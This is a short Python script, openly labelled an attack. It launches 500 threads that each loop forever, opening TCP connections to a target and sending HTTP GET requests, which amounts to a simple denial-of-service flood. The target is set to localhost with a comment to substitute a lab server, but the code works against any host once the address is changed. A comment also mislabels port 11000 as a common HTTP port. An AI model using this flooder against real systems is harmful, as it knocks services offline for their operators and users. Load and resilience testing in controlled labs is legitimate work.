import socket
import threading

# Target Information
target_ip = "127.0.0.1"  # Replace with your target server in a lab
target_port = 11000             # Common HTTP port

def attack():
    while True:
        # Create a socket and send a lot of data
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
            print("connect_true")
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            sock.close()
        except Exception as e:
            print(f"Error: {e}")

# Launch multiple threads
threads = []
for i in range(500):  # Number of threads
    t = threading.Thread(target=attack)
    threads.append(t)
    t.start()

for t in threads:
    t.join()